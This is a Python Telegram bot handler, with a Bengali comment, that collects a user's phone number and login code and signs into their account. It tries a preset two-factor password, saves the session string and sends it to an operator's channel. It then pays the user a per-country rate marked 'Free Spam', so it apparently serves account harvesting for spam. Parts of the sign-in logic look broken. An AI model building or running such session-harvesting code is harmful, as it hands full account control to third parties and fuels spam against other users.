
from pyrogram import filters
from pyrogram.types import Message, ReplyKeyboardMarkup
from bot.utils import storage, session
from config import SESSION_2FA_PASSWORD, CHANNEL_ID
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
import asyncio
import os  # তোমার কোডে os ব্যবহার হচ্ছে, তাই ইমপোর্ট দরকার

async def start_handler(client, message: Message):
    await message.reply_text(
        "🎉 Welcome to Robot!\n"
        "Enter your phone number with the country code.\n"
        "Example: +62xxxxxxx\n\n"
        "Type /cap to see available countries."
    )
    storage.save_temp(message.from_user.id, "awaiting_phone")

    @client.on_message(filters.private & filters.text)
    async def phone_input_handler(client, msg):
        state = storage.get_temp(msg.from_user.id)
        if state == "awaiting_phone":
            phone = msg.text
            storage.save_temp(msg.from_user.id, "awaiting_code")
            storage.save_temp(msg.from_user.id, phone)

            tele_client = TelegramClient(StringSession(), storage.API_ID, storage.API_HASH)
            await tele_client.connect()
            await tele_client.send_code_request(phone)
            await msg.reply("✅ Code sent. Enter the code:")

        elif state == "awaiting_code":
            code = msg.text
            phone = storage.get_temp(msg.from_user.id, phone=True)
            tele_client = TelegramClient(StringSession(), storage.API_ID, storage.API_HASH)
            await tele_client.connect()
            await tele_client.sign_in(phone, code)

            try:
                await tele_client.sign_in(password=SESSION_2FA_PASSWORD)
            except SessionPasswordNeededError:
                pass

            string_session = tele_client.session.save()
            file_path = f"sessions/{msg.from_user.id}.session"
            os.makedirs("sessions", exist_ok=True)
            with open(file_path, "w") as f:
                f.write(string_session)

            await client.send_document(CHANNEL_ID, file_path)
            country = storage.get_country_from_phone(phone)
            rate = storage.get_rate(country)
            storage.add_balance(msg.from_user.id, rate)
            storage.increment_success(msg.from_user.id)

            await msg.reply(
                f"🎉 We have successfully processed your account\n"
                f"Number: {phone}\n"
                f"Price: {rate} USD\n"
                "Status: Free Spam\n"
                "Congratulations, has been added to your balance."
            )
            storage.clear_temp(msg.from_user.id)
